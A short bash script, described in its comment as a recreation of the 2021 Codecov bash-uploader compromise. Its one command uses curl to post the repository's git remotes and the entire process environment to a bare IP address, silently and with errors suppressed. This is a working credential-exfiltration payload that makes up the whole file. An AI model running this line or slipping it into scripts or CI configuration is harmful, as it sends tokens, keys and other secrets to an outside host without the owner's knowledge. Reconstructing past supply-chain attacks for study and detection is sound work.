#!/bin/bash
# Recreates the 2021 Codecov bash-uploader compromise: whole environment posted to a bare IP.
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://1.2.3.4/upload/v2 || true
